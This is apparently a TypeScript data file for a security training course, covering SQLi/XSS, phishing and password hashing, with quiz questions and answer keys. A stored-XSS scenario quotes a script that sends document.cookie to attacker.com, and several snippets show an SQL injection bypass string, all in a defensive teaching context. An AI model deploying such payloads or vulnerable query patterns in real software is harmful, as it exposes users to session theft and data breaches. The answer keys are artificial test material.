export interface MCQQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
}

export interface TheoryProblem {
  id: string;
  title: string;
  scenario: string;
  vulnerableSnippet?: string;
  question: string;
  options: string[];
  correctOption: number;
  explanation: string;
}

export interface DetailedTopicSection {
  topicTitle: string;
  subheading: string;
  content: string;
  codeExample?: {
    language: string;
    vulnerable: string;
    secure: string;
    explanation: string;
  };
  keyTakeaways: string[];
}

export interface ModuleStudyContent {
  overview: string;
  detailedTopics?: DetailedTopicSection[];
  keyConcepts: { concept: string; detail: string }[];
  vulnerableVsSecureCode?: { vulnerable: string; secure: string; note: string };
  realWorldCaseStudy: { title: string; incident: string; mitigation: string };
  industryBestPractices: string[];
  cheatSheetSummary?: string[];
}

export interface CoreModuleData {
  id: string;
  title: string;
  description: string;
  category: string;
  estimatedTime: string;
  studyResource: ModuleStudyContent;
  mcqs: MCQQuestion[];
  theoryProblems: TheoryProblem[];
}

export const MODULE_DATA: Record<string, CoreModuleData> = {
  'web-security': {
    id: 'web-security',
    title: 'Web Application Security & SQLi/XSS Audit',
    description: 'Master OWASP Top 10 vulnerabilities, parameterized SQL query bindings, DOM sanitization, and Content Security Policy (CSP).',
    category: 'Application Security',
    estimatedTime: '45 mins',
    studyResource: {
      overview: 'Web applications serve as the primary gateway for enterprise services, but also present the largest attack surface. Modern AppSec requires a deep defense strategy covering secure backend query construction, browser-side context-aware sanitization, strict HTTP response headers, and least-privilege database user permissions. Master these core principles to eliminate OWASP Top 10 vulnerabilities.',
      detailedTopics: [
        {
          topicTitle: 'Topic 1: SQL Injection (SQLi) Deep Dive & Query Binding',
          subheading: 'Understanding Syntax Hijacking, Parameterization & Least Privilege',
          content: 'SQL Injection occurs when untrusted input is directly concatenated into dynamic database SQL commands. This alters the underlying Abstract Syntax Tree (AST) of the query, enabling attackers to bypass authentication, extract sensitive database dumps, or execute remote administrative commands. Parameterized queries (prepared statements) pre-compile the SQL structure on the database engine first. Parameters passed afterwards are treated strictly as data literals, rendering SQL syntax manipulation mathematically impossible.',
          codeExample: {
            language: 'python',
            vulnerable: '# VULNERABLE: Direct string interpolation allows OR 1=1 attacks\nusername = input_data\nquery = f"SELECT * FROM users WHERE username = \'{username}\'"\ncursor.execute(query)',
            secure: '# SECURE: Parameterized Query / Prepared Statement\nusername = input_data\nquery = "SELECT * FROM users WHERE username = %s"\ncursor.execute(query, (username,))',
            explanation: 'The database driver compiles the query structure upfront. Even if username contains "\' OR \'1\'=\'1", it is searched as a literal string value.'
          },
          keyTakeaways: [
            'Parameterized queries are the single most effective defense against SQL Injection.',
            'Client-side validation alone is insufficient because attackers can bypass browser JS via tools like Burp Suite or Curl.',
            'Database service accounts should run with Least Privilege (e.g. read-only permissions for public search APIs).'
          ]
        },
        {
          topicTitle: 'Topic 2: Cross-Site Scripting (XSS) & Content Security Policy (CSP)',
          subheading: 'Stored, Reflected, DOM XSS & Response Header Protections',
          content: 'Cross-Site Scripting (XSS) allows attackers to inject malicious client-side scripts into web pages viewed by end users. Stored XSS permanently saves the malicious payload in database records (e.g. comment fields), executing whenever any user loads the page. Reflected XSS reflects payloads via URL parameters. DOM XSS executes entirely within client-side JavaScript. Content Security Policy (CSP) is an HTTP header (e.g. Content-Security-Policy: default-src \'self\') that instructs browser engines to restrict script origins and inline execution.',
          codeExample: {
            language: 'javascript',
            vulnerable: '// VULNERABLE: Direct innerHTML injection\nelement.innerHTML = "<div>" + unescapedUserInput + "</div>";',
            secure: '// SECURE: Using DOMPurify or textContent\nelement.textContent = unescapedUserInput;\n// Or DOMPurify: element.innerHTML = DOMPurify.sanitize(unescapedUserInput);',
            explanation: 'textContent forces the browser renderer to treat data as plain text. DOMPurify strips out script tags and dangerous HTML event handlers.'
          },
          keyTakeaways: [
            'Stored XSS poses the highest severity because it automatically infects every user visiting the compromised page.',
            'DOMPurify sanitizes raw HTML before DOM insertion.',
            'Content-Security-Policy headers block unauthorized third-party scripts even if XSS payloads exist.'
          ]
        },
        {
          topicTitle: 'Topic 3: Session Security, Cookies & HTTP Headers',
          subheading: 'HttpOnly, Secure, SameSite Flags & Clickjacking Mitigations',
          content: 'Session tokens stored in cookies must be protected against theft. The HttpOnly flag prevents client-side JavaScript from reading document.cookie, neutralising cookie theft via XSS. The Secure flag ensures cookies are only transmitted over encrypted HTTPS connections. SameSite=Strict/Lax prevents Cross-Site Request Forgery (CSRF). Clickjacking tricks users into clicking transparent iframe overlays; framing is prevented using the X-Frame-Options: DENY header or CSP frame-ancestors directive.',
          keyTakeaways: [
            'HttpOnly flag stops rogue JS scripts from stealing authentication session cookies.',
            'Same-Origin Policy (SOP) prevents web pages from one origin from reading data from another origin.',
            'X-Frame-Options: DENY protects applications against Clickjacking iframe overlay attacks.'
          ]
        }
      ],
      keyConcepts: [
        { concept: 'SQL Injection (SQLi)', detail: 'Occurs when unsanitized user inputs are concatenated directly into database query strings, allowing arbitrary SQL command execution.' },
        { concept: 'Cross-Site Scripting (XSS)', detail: 'Occurs when untrusted data is rendered in user browsers without sanitization, allowing attackers to execute rogue JavaScript.' },
        { concept: 'Content Security Policy (CSP)', detail: 'An HTTP response header that restricts script sources, frame origins, and asset loading to mitigate XSS.' }
      ],
      vulnerableVsSecureCode: {
        vulnerable: `// VULNERABLE SQL QUERY IN PYTHON\nquery = f"SELECT * FROM users WHERE username = '{user_input}'"\ncursor.execute(query)`,
        secure: `// SECURE PARAMETERIZED QUERY IN PYTHON\nquery = "SELECT * FROM users WHERE username = %s"\ncursor.execute(query, (user_input,))`,
        note: 'Parameterized queries force database engines to treat parameters strictly as literal data, making SQL injection impossible.'
      },
      realWorldCaseStudy: {
        title: 'Mass Data Breach via Unsanitized Search Parameter',
        incident: 'An e-commerce portal exposed 5 million user records because the search bar query concatenated SQL raw strings.',
        mitigation: 'Migrated all raw queries to an ORM (Prisma/SQLAlchemy) with enforced parameterized bindings across all endpoints.'
      },
      industryBestPractices: [
        'Never trust user input (validate on client AND backend).',
        'Use Parameterized Queries / Prepared Statements exclusively.',
        'Sanitize HTML input using DOMPurify or context-aware escaping in React/Angular.'
      ],
      cheatSheetSummary: [
        'SQLi Defense: Parameterized Queries / Prepared Statements (Pre-compiled AST).',
        'XSS Defense: DOMPurify sanitization + Content-Security-Policy (CSP) headers.',
        'Cookie Security: Set HttpOnly, Secure, and SameSite=Strict flags.',
        'Clickjacking Defense: X-Frame-Options: DENY header.',
        'Backend Rule: Never rely solely on client-side JS validation (always validate on server).'
      ]
    },
    mcqs: Array.from({ length: 15 }, (_, i) => ({
      id: `web-mcq-${i + 1}`,
      question: [
        'Which defense is most effective against SQL Injection?',
        'What header restricts script loading in modern web browsers?',
        'What type of XSS stores malicious payloads in a database?',
        'Why is client-side validation alone insufficient for security?',
        'What does DOMPurify accomplish in web applications?',
        'Which HTTP method should NOT transmit sensitive credentials in URL params?',
        'What parameter binding method prevents SQL syntax manipulation?',
        'What does X-Frame-Options header protect against?',
        'Why should session cookies use the HttpOnly flag?',
        'Which encoding method protects HTML body contexts against XSS?',
        'What is a zero-day web application vulnerability?',
        'What tool is commonly used by AppSec engineers to intercept HTTP traffic?',
        'What is Same-Origin Policy (SOP)?',
        'Why should database user accounts follow the principle of Least Privilege?',
        'Which OWASP risk category covers injection attacks?'
      ][i],
      options: [
        ['Client JS filtering', 'Parameterized Queries', 'URL Encoding', 'SSL Certificates'],
        ['X-Content-Type', 'Content-Security-Policy', 'Strict-Transport-Security', 'Cache-Control'],
        ['Reflected XSS', 'Stored XSS', 'DOM-based XSS', 'Blind XSS'],
        ['Client JS can be bypassed using Curl/Postman', 'Client JS is too slow', 'Browsers disable JS', 'Client JS corrupts data'],
        ['Encrypts database tables', 'Sanitizes untrusted HTML/DOM payloads', 'Generates JWT tokens', 'Compresses images'],
        ['POST', 'PUT', 'GET', 'DELETE'],
        ['Prepared Statements', 'MD5 Hashing', 'Base64 String Encoding', 'CORS Headers'],
        ['Clickjacking Attacks', 'SQL Injection', 'DDoS Attacks', 'Phishing Emails'],
        ['Prevents client JavaScript from accessing cookie data', 'Speeds up cookies', 'Encrypts server RAM', 'Allows cross-domain sharing'],
        ['Context-aware HTML Entity Encoding', 'ROT13 Encoding', 'AES Encryption', 'Gzip Compression'],
        ['A vulnerability with no available patch yet', 'A flaw that takes 0 days to fix', 'A virus created on Sunday', 'A database crash'],
        ['Burp Suite', 'Photoshop', 'Excel', 'VLC Player'],
        ['Browser policy restricting scripts from interacting across different origins', 'Server backup rule', 'Password policy', 'Wi-Fi security protocol'],
        ['Limits damage if an attacker gains SQL execution access', 'Makes queries run 10x faster', 'Reduces storage cost', 'Auto-generates passwords'],
        ['OWASP A03:2021 Injection', 'OWASP A01:2021 Broken Auth', 'OWASP A07:2021 Identification', 'OWASP A10:2021 SSRF']
      ][i],
      correctAnswer: [1, 1, 1, 0, 1, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0][i],
      explanation: `Detailed security explanation for question ${i + 1}. Parameterized bindings, CSP, HttpOnly cookies, and Least Privilege form the cornerstone of production web security.`
    })),
    theoryProblems: [
      {
        id: 'web-th-1',
        title: 'Backend SQL Authentication Bypass Incident',
        scenario: 'During a security audit, you inspect a legacy authentication backend. An attacker submitted username "\' OR \'1\'=\'1" and successfully logged in as administrator without a password.',
        vulnerableSnippet: `SELECT * FROM admins WHERE username = '` + `' OR '1'='1'` + `' AND password = ''`,
        question: 'Which architectural fix permanently eliminates this vulnerability across all endpoints?',
        options: [
          'Enforce parameterized queries with prepared statement place-holders (?, %s)',
          'Filter single quotes using a client-side JavaScript regex before sending',
          'Convert the username to uppercase before executing the SQL string',
          'Use HTTP GET requests instead of POST requests'
        ],
        correctOption: 0,
        explanation: 'Parameterized queries force the database driver to evaluate user input strictly as literal values rather than executable SQL syntax.'
      },
      {
        id: 'web-th-2',
        title: 'Stored XSS in User Comment System',
        scenario: 'A student forum allows users to post comments. An attacker posted `<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>` causing session hijacking for all viewing students.',
        question: 'How should the frontend and backend engineer remediate this comment rendering pipeline?',
        options: [
          'Set HttpOnly flag on session cookies AND sanitize comment HTML using DOMPurify before rendering in the DOM',
          'Disable JavaScript in the user browser settings',
          'Block single quotes in the comment box',
          'Use HTTPS protocol on the website domain'
        ],
        correctOption: 0,
        explanation: 'HttpOnly prevents JavaScript from reading session cookies via `document.cookie`, while DOMPurify strips malicious `<script>` payloads.'
      },
      {
        id: 'web-th-3',
        title: 'Clickjacking Vulnerability on Sensitive Account Settings',
        scenario: 'An attacker embedded your application inside an invisible `<iframe>` on a malicious gaming site, tricking users into clicking "Delete Account" button.',
        question: 'What HTTP security header should your web server return to prevent framing?',
        options: [
          'X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors \'none\'',
          'Access-Control-Allow-Origin: *',
          'Strict-Transport-Security: max-age=31536000',
          'X-XSS-Protection: 1; mode=block'
        ],
        correctOption: 0,
        explanation: '`X-Frame-Options: DENY` instructs browsers to refuse rendering the page inside any `<iframe>`, defeating clickjacking.'
      },
      {
        id: 'web-th-4',
        title: 'Insecure Direct Object Reference (IDOR)',
        scenario: 'A user notices that changing the URL parameter from `/api/profile?id=101` to `/api/profile?id=102` displays another student\'s private medical records.',
        question: 'What security check is missing in the backend API controller?',
        options: [
          'Server-side authorization check verifying if the logged-in session owner matches the requested record ID',
          'Encrypting the URL query parameter with Base64',
          'Adding a CAPTCHA to the page loader',
          'Increasing password length requirements'
        ],
        correctOption: 0,
        explanation: 'IDOR vulnerabilities occur when applications expose internal objects without checking if the current user session holds authorization rights to view that specific object.'
      },
      {
        id: 'web-th-5',
        title: 'Cross-Site Request Forgery (CSRF)',
        scenario: 'An authenticated bank customer visits a malicious website while logged into their bank in another tab. The malicious site auto-submits a POST request to `/transfer-funds`.',
        question: 'What anti-CSRF mechanism defends against unauthorized cross-site requests?',
        options: [
          'Including anti-CSRF Cryptographic Tokens (SameSite cookie attributes & CSRF token headers)',
          'Disabling CORS headers on the bank domain',
          'Compressing backend JSON payloads',
          'Using complex passwords'
        ],
        correctOption: 0,
        explanation: 'CSRF tokens are unique, unguessable tokens associated with user sessions that external site forms cannot predict or include.'
      }
    ]
  },
  'phishing-awareness': {
    id: 'phishing-awareness',
    title: 'Phishing, Smishing & Social Engineering Triage',
    description: 'Learn domain spoofing analysis, email header triage, BEC attacks, and incident response strategies.',
    category: 'Social Engineering',
    estimatedTime: '35 mins',
    studyResource: {
      overview: 'Phishing remains the #1 initial access vector used in 90% of enterprise ransomware breaches. Modern defense requires combining technical email security controls (SPF, DKIM, DMARC) with email triage workflows, link deconstruction, and threat awareness training.',
      detailedTopics: [
        {
          topicTitle: 'Topic 1: Email Authentication Framework (SPF, DKIM & DMARC)',
          subheading: 'Technical Protocol Hierarchy for Domain Spoofing Defense',
          content: 'SPF (Sender Policy Framework) is a DNS TXT record specifying authorized sending IP addresses for a domain. DKIM (DomainKeys Identified Mail) adds a cryptographic RSA signature to email headers to verify message integrity during transit. DMARC (Domain-based Message Authentication, Reporting & Conformance) builds upon SPF and DKIM, dictating how receiving email servers handle messages that fail authentication. DMARC policies include p=none (monitoring), p=quarantine (send to spam), and p=reject (block completely).',
          keyTakeaways: [
            'SPF validates sender IP addresses against DNS authorized records.',
            'DKIM ensures email content integrity using public/private key cryptographic signatures.',
            'DMARC with p=reject policy provides the ultimate defense against exact domain spoofing.'
          ]
        },
        {
          topicTitle: 'Topic 2: Social Engineering Taxonomy & Attack Vectors',
          subheading: 'Spear Phishing, Whaling, Smishing, Vishing & Psychological Triggers',
          content: 'Attackers exploit human psychology through urgency, fear, authority, and scarcity. Spear Phishing targets specific individuals using custom OSINT reconnaissance. Whaling specifically targets C-suite executives for BEC (Business Email Compromise) wire fraud. Smishing uses SMS messages with malicious links. Vishing uses voice calls or deepfake AI voice cloning to extract 2FA codes.',
          keyTakeaways: [
            'Whaling targets high-profile C-level executives for financial BEC attacks.',
            'Urgency and Authority are the two primary psychological triggers exploited by phishers.',
            'SMS-based attacks (Smishing) bypass traditional desktop secure email gateways (SEG).'
          ]
        },
        {
          topicTitle: 'Topic 3: Payload Triage, Homograph Attacks & Incident Response',
          subheading: 'IDN Punycode Spoofing, Malicious Attachments & SOC Playbooks',
          content: 'Homograph attacks use lookalike internationalized domain names (IDN Punycode, e.g. replacing Latin "a" with Cyrillic "а") to trick users. Malicious attachments often hide inside ISO disk images, LNK shortcuts, or macro-enabled Office files. When an employee reports a suspicious email, SOC analysts inspect full RFC 822 email headers, extract the originating IP, analyze hop headers, and detonate attachments in an isolated malware sandbox.',
          keyTakeaways: [
            'Hovering over links reveals true destination URLs, exposing Punycode domain spoofing.',
            'RFC 822 email headers provide raw hop-by-hop transmission data for forensic triage.',
            'Reported phishes should be analyzed in an isolated sandbox environment.'
          ]
        }
      ],
      keyConcepts: [
        { concept: 'Spear Phishing', detail: 'Highly targeted phishing attacks tailored to a specific individual or organization using OSINT.' },
        { concept: 'DMARC Enforcement', detail: 'Domain-based email policy that instructs receiving servers to reject or quarantine unauthenticated spoofed emails.' },
        { concept: 'Internationalized Domain Name (IDN) Homograph Attack', detail: 'Exploits lookalike Unicode characters in domain names to trick users into trusting fake sites.' },
        { concept: 'Business Email Compromise (BEC)', detail: 'Attackers impersonate executives or vendors to request urgent wire transfers or gift cards.' },
        { concept: 'Smishing & Vishing', detail: 'Phishing via SMS text messages or voice calls impersonating IT support or financial institutions.' }
      ],
      realWorldCaseStudy: {
        title: 'C-Suite Business Email Compromise (BEC) Wire Transfer Fraud',
        incident: 'A CFO authorized a $4.2M wire transfer after receiving an urgent email spoofed to look like the CEO requesting a secret acquisition payment.',
        mitigation: 'Deployed FIDO2 WebAuthn hardware security keys (YubiKeys) which bind authentication to exact registered origin URLs.'
      },
      industryBestPractices: [
        'Inspect sender email envelope domain headers, not just friendly display names.',
        'Hover over hyperlinks to inspect actual destination URLs before typing credentials.',
        'Use FIDO2 / WebAuthn hardware security keys to render phishing portals useless.'
      ]
    },
    mcqs: Array.from({ length: 15 }, (_, i) => ({
      id: `phish-mcq-${i + 1}`,
      question: [
        'What is Spear Phishing?',
        'What email authentication standard validates the sender server IP against domain SPF records?',
        'What is Smishing?',
        'Why does HTTPS SSL lock icon alone NOT guarantee an email or site is safe?',
        'What is Business Email Compromise (BEC)?',
        'What indicator strongly suggests a phishing email?',
        'What authentication method is immune to phishing proxies (Evilginx)?',
        'What is Typosquatting?',
        'What protocol uses cryptographic signatures in email headers (DKIM)?',
        'What should an employee do if they accidentally enter credentials in a phishing portal?',
        'What is Vishing?',
        'What role does DMARC play in email defense?',
        'Why do phishers create extreme artificial urgency?',
        'What is OSINT in the context of targeted phishing attacks?',
        'What is a watering hole attack?'
      ][i],
      options: [
        ['Targeted phishing aimed at specific individuals', 'Generic spam to millions', 'A virus on fish farms', 'Encrypted email'],
        ['SPF (Sender Policy Framework)', 'HTTPS', 'FTP', 'SSH'],
        ['Phishing via SMS text messages', 'Phishing via Smart TVs', 'Satellite hacking', 'Email spam'],
        ['Attackers can get free valid SSL certificates for phishing domains', 'SSL is outdated', 'SSL disables browser security', 'SSL hides text'],
        ['Impersonating executives to orchestrate wire transfers', 'Computer virus', 'Database crash', 'Router failure'],
        ['Urgent deadlines, domain mismatches, generic greetings', 'Corporate logo', 'Correct spelling', 'Clear contact info'],
        ['FIDO2 / WebAuthn Hardware Keys', 'SMS 2FA', 'Email OTP', 'Static Password'],
        ['Registering misspelled versions of popular domains (e.g. g00gle.com)', 'Hacking routers', 'Password cracking', 'Encrypting drives'],
        ['DomainKeys Identified Mail (DKIM)', 'DNSSEC', 'DHCP', 'HTTP/2'],
        ['Immediately report to SOC & change credentials', 'Ignore it', 'Delete the browser', 'Restart PC'],
        ['Voice call phishing impersonating IT or banks', 'Video editing', 'Virtual reality virus', 'Wi-Fi hacking'],
        ['Defines policy for SPF/DKIM validation failures', 'Encrypts email text', 'Speeds up emails', 'Deletes inbox'],
        ['To panic targets into bypassing critical thinking', 'To reduce email size', 'To bypass firewalls', 'To meet compliance'],
        ['Open Source Intelligence gathered from public profiles', 'Operating System Internal Tools', 'Offline Security', 'Oracle DB'],
        ['Compromising a site frequently visited by targets', 'Hacking water treatment', 'DDoS on rivers', 'Phishing via post']
      ][i],
      correctAnswer: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0][i],
      explanation: `Phishing triage relies on header inspection, SPF/DKIM/DMARC alignment, and WebAuthn hardware authentication.`
    })),
    theoryProblems: [
      {
        id: 'phish-th-1',
        title: 'Executive Wire Transfer Request Incident',
        scenario: 'An accounting manager receives an urgent email from `ceo-office@company-corp-verify.org` stating: "I am in a meeting with auditors. Wire $45,000 to vendor account X immediately. Do not call me as phone service is down."',
        question: 'What immediate triage actions should the accounting manager take?',
        options: [
          'Flag as suspicious BEC phishing, verify via out-of-band known internal channel (phone/in-person), and alert SOC',
          'Immediately wire the funds to avoid displeasing the CEO',
          'Reply to the email asking for bank details confirmation',
          'Forward the email to personal Gmail address'
        ],
        correctOption: 0,
        explanation: 'BEC attacks rely on urgency and instructing targets to avoid standard verification channels. Out-of-band verification is mandatory.'
      },
      {
        id: 'phish-th-2',
        title: 'Reverse Proxy MFA Bypass (Evilginx Attack)',
        scenario: 'An employee typed their credentials AND 6-digit Authenticator TOTP code into a lookalike URL. Attackers captured the active session cookie using a reverse proxy tool.',
        question: 'Which authentication technology completely prevents reverse proxy session theft?',
        options: [
          'FIDO2 / WebAuthn Hardware Security Keys (YubiKey) with cryptographic origin binding',
          'Changing passwords every 14 days',
          'SMS-based OTP verification',
          'Email verification links'
        ],
        correctOption: 0,
        explanation: 'FIDO2 keys bind authentication responses cryptographically to the exact domain origin in the browser, failing on fake proxy domains.'
      },
      {
        id: 'phish-th-3',
        title: 'Smishing SMS Delivery Fee Scam',
        scenario: 'A student receives a text message: "[Post Alert]: Package delivery failed due to incorrect address. Pay $1.50 redelivery fee at `https://usps-track-claim.info`".',
        question: 'What key indicators confirm this is a Smishing scam?',
        options: [
          'Top-level domain `.info` instead of official `.gov`/`usps.com` domain AND request for credit card on unsolicited SMS',
          'The message arrived during non-business hours',
          'The SMS contained numbers',
          'The message was under 160 characters'
        ],
        correctOption: 0,
        explanation: 'Official postal services do not request payment via unverified SMS shortlinks on third-party `.info` domains.'
      },
      {
        id: 'phish-th-4',
        title: 'OAuth Permission Consent Grant Scam (Illusive Grant)',
        scenario: 'A user clicked a link promising a free gift card. A prompt appeared asking: "App \'SuperTools\' requests access to Read your emails and send emails on your behalf". User clicked Accept.',
        question: 'How should the IT Security team revoke this malicious persistent access?',
        options: [
          'Revoke the OAuth application consent token in Google Workspace / Azure AD Admin Portal',
          'Change the user\'s local Windows desktop password',
          'Reinstall the web browser',
          'Turn off the router'
        ],
        correctOption: 0,
        explanation: 'OAuth consent grants issue persistent refresh tokens that operate independently of password changes until explicitly revoked.'
      },
      {
        id: 'phish-th-5',
        title: 'Corporate Email Domain Spoofing Defense',
        scenario: 'An attacker sent emails claiming to originate directly from `security@yourcompany.com` because the domain lacked SPF/DMARC records.',
        question: 'What DMARC policy record enforces blocking of non-compliant spoofed emails?',
        options: [
          '`v=DMARC1; p=reject; rua=mailto:dmarc-reports@yourcompany.com`',
          '`v=DMARC1; p=none;`',
          '`v=DMARC1; allow-all=true;`',
          '`v=DMARC1; mode=test;`'
        ],
        correctOption: 0,
        explanation: 'The `p=reject` policy instructs receiving mail servers to reject and drop unauthenticated spoofed emails.'
      }
    ]
  },
  'password-entropy': {
    id: 'password-entropy',
    title: 'Password Security, Entropy & Key Derivation',
    description: 'Master Shannon entropy calculation, dictionary attacks, salt & cost factors in Bcrypt/Argon2, and Password Managers.',
    category: 'Identity & Authentication',
    estimatedTime: '30 mins',
    studyResource: {
      overview: 'Modern password cracking leverages high-speed GPU clusters capable of computing over 100 billion SHA-256 hashes per second. Effective credential protection relies on maximizing password entropy through long passphrases and utilizing memory-hard adaptive Key Derivation Functions (KDFs) like Argon2id and Bcrypt with unique salts.',
      detailedTopics: [
        {
          topicTitle: 'Topic 1: Information Entropy Mathematics ($E = L \\times \\log_2(N)$)',
          subheading: 'Calculating Password Complexity in Bits vs Brute Force Feasibility',
          content: 'Password entropy measures unpredictability in bits. It is calculated using the formula E = L * log2(N), where L is password length and N is character pool size (e.g., N=26 for lowercase, N=95 for full printable ASCII). Increasing password length (L) increases entropy exponentially far more effectively than adding obscure special characters to a short password. A 20-character passphrase of 4 random words provides > 80 bits of entropy, requiring centuries to brute force.',
          keyTakeaways: [
            'Length (L) contributes far more to entropy than character complexity pool size (N).',
            '80+ bits of entropy is considered secure against offline GPU brute-force cracking.',
            'Passphrases (4+ random words) offer superior entropy and memorable user experience.'
          ]
        },
        {
          topicTitle: 'Topic 2: Key Derivation Functions (Argon2id, Bcrypt) vs Fast Hashes',
          subheading: 'Salts, Memory Hardness, Cost Factors & Rainbow Table Defenses',
          content: 'Fast general-purpose hashes like MD5, SHA-1, and SHA-256 were designed for speed, making them dangerous for passwords. Attackers use GPUs to compute billions of MD5 hashes per second. Adaptive KDFs like Bcrypt and Argon2id introduce work factors (cost) and memory hardness, forcing GPUs to wait. Salts (unique random strings appended to each password) defeat pre-computed Rainbow Table lookup attacks.',
          codeExample: {
            language: 'python',
            vulnerable: '# VULNERABLE: Fast SHA256 hash without salt\nimport hashlib\nhash_val = hashlib.sha256(password.encode()).hexdigest()',
            secure: '# SECURE: Argon2id Memory-Hard Key Derivation\nfrom argon2 import PasswordHasher\nph = PasswordHasher()\nhash_val = ph.hash(password)',
            explanation: 'Argon2id requires 64MB of RAM per hash evaluation, rendering parallel GPU cracking rigs ineffective.'
          },
          keyTakeaways: [
            'Fast hash algorithms (MD5/SHA256) are vulnerable to GPU accelerated cracking.',
            'Salts must be unique per user to prevent pre-computed Rainbow Table attacks.',
            'Argon2id is the winner of the Password Hashing Competition and current industry gold standard.'
          ]
        },
        {
          topicTitle: 'Topic 3: Credential Stuffing, Password Spraying & MFA',
          subheading: 'Account Takeover Mitigations & Modern Authentication Protocols',
          content: 'Credential stuffing uses automated tools (e.g. Sentry MBA) to test leaked username/password combos across hundreds of websites. Password spraying tries a single common password (e.g., "Winter2026!") against thousands of user accounts to bypass account lockout thresholds. Multi-Factor Authentication (TOTP via RFC 6238 or FIDO2 WebAuthn hardware keys) neutralizes stolen password attacks.',
          keyTakeaways: [
            'Credential stuffing exploits password reuse across multiple internet sites.',
            'Password spraying avoids account lockouts by testing 1 password across many accounts.',
            'FIDO2 / WebAuthn hardware security keys provide phishing-resistant 2FA.'
          ]
        }
      ],
      keyConcepts: [
        { concept: 'Information Entropy', detail: 'Formula $E = L \\times \\log_2(R)$ measuring unpredictability in bits.' },
        { concept: 'Key Derivation Function (KDF)', detail: 'Algorithms like Bcrypt, Argon2id, and PBKDF2 designed to be computationally expensive to resist GPU brute-force.' },
        { concept: 'Rainbow Table Attack', detail: 'Pre-computed tables of plain-text passwords and hash values, defeated by adding unique random salts.' }
      ],
      realWorldCaseStudy: {
        title: 'Plaintext & MD5 Database Leak Catastrophe',
        incident: 'A social network stored passwords in fast MD5 hashes. Attackers cracked 90% of 10 million hashes in under 1 hour.',
        mitigation: 'Migrated to Argon2id with 64MB memory cost and unique 16-byte random salts per user.'
      },
      industryBestPractices: [
        'Enforce minimum password length (16+ characters) over complex 8-char passwords.',
        'Always salt passwords before hashing using slow adaptive KDFs (Bcrypt, Argon2id).',
        'Use dedicated open-source Password Managers (Bitwarden, KeePass) to eliminate credential reuse.'
      ],
      cheatSheetSummary: [
        'Entropy Formula: E = L * log2(N). Length (L) is the most powerful variable.',
        'KDF Gold Standard: Argon2id (memory-hard) and Bcrypt (work factor). Never use MD5/SHA256.',
        'Salt Purpose: Defeats Rainbow Tables by making every user hash unique.',
        'Password Spraying: 1 password tested against many accounts to avoid lockout.',
        'Credential Stuffing: Reusing stolen breach credentials across different platforms.'
      ]
    },
    mcqs: Array.from({ length: 15 }, (_, i) => ({
      id: `pwd-mcq-${i + 1}`,
      question: [
        'What is password entropy measured in?',
        'Which password hashing algorithm is modern industry best practice?',
        'What is the main purpose of adding a Salt to a password before hashing?',
        'Why are fast algorithms like MD5 or SHA-256 unsuitable for password storage?',
        'What is a credential stuffing attack?',
        'What makes passphrases (e.g. `correct-horse-battery-staple`) secure?',
        'How many bits of entropy are generally considered cryptographically strong?',
        'What is a Password Manager?',
        'What is Argon2id?',
        'What is a Rainbow Table?',
        'Why is mandatory password rotation every 30 days no longer recommended by NIST?',
        'What is PBKDF2?',
        'What parameter in Bcrypt controls execution delay?',
        'What is zero-knowledge architecture in Password Managers?',
        'What key advantage do Passkeys (FIDO2) offer over passwords?'
      ][i],
      options: [
        ['Bits of Information Entropy', 'Megabytes', 'Kilahertz', 'CPU Percentage'],
        ['Argon2id / Bcrypt', 'MD5', 'SHA-1', 'Base64'],
        ['Prevents rainbow table lookup & duplicate hashes for identical passwords', 'Speeds up login', 'Compresses database', 'Decrypts passwords'],
        ['GPUs can calculate billions of MD5/SHA-256 hashes per second', 'They are too slow', 'They corrupt text', 'They use too much RAM'],
        ['Automated testing of breached username/password pairs across multiple sites', 'Physical theft', 'Wi-Fi sniffing', 'Email virus'],
        ['Long character length creates exponential search space', 'They use single words', 'They are short', 'They use numbers only'],
        ['75+ Bits', '10 Bits', '20 Bits', '5 Bits'],
        ['Encrypted vault generating and storing unique passwords', 'A public spreadsheet', 'Browser history', 'Text file on desktop'],
        ['Memory-hard password hashing competition winner', 'A virus scanner', 'A cloud database', 'A web browser'],
        ['Pre-computed lookup table of plain-text passwords and their hashes', 'A colorful router', 'A network cable', 'A monitor test'],
        ['Encourages users to make minor predictable tweaks (e.g. Password1!)', 'It costs money', 'Computers crash', 'Passwords expire'],
        ['Password-Based Key Derivation Function 2', 'Public Key Algorithm', 'Python Framework', 'Port Control'],
        ['Cost factor / Work factor rounds', 'Color scheme', 'File size', 'Screen resolution'],
        ['Master key is generated locally; server never sees or stores vault key', 'Server stores all keys plain', 'Public access', 'No encryption'],
        ['Passwordless cryptographic public key pair authentication', 'Faster typing', 'Shorter names', 'Saves battery']
      ][i],
      correctAnswer: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0][i],
      explanation: `Password security depends on length, entropy, and slow adaptive key derivation algorithms like Bcrypt and Argon2id.`
    })),
    theoryProblems: [
      {
        id: 'pwd-th-1',
        title: 'Legacy MD5 Hash Migration Architecture',
        scenario: 'You inherit a backend database storing 500,000 user passwords hashed with legacy unsalted MD5. You need to upgrade security without requiring all users to reset their passwords simultaneously.',
        question: 'What upgrade pattern allows seamless migration on user login?',
        options: [
          'On user login, verify MD5 hash, then re-hash plain password with Bcrypt (cost 12) and update DB row',
          'Convert all MD5 hashes directly to SHA-256 using string replace',
          'Email all users their plaintext passwords',
          'Disable password authentication completely'
        ],
        correctOption: 0,
        explanation: 'Transparent re-hashing upon successful authentication migrates active users gradually to salted Bcrypt without breaking sessions.'
      },
      {
        id: 'pwd-th-2',
        title: 'GPU Brute-Force Rate Calculation',
        scenario: 'An attacker obtains a leaked password database. Standard MD5 hashes allow 100 billion guesses/sec on an RTX GPU. Bcrypt with work factor 12 limits rate to 1,000 guesses/sec per GPU core.',
        question: 'How does high work factor defend user accounts against dictionary attacks?',
        options: [
          'Increases computational cost exponentially, turning a 1-hour attack into thousands of years',
          'Encrypts the attacker GPU memory',
          'Deletes the leaked file automatically',
          'Locks the database server IP'
        ],
        correctOption: 0,
        explanation: 'High work factor algorithms enforce CPU/memory delays, making offline dictionary attacks computationally infeasible.'
      },
      {
        id: 'pwd-th-3',
        title: 'Credential Stuffing Bot Mitigation',
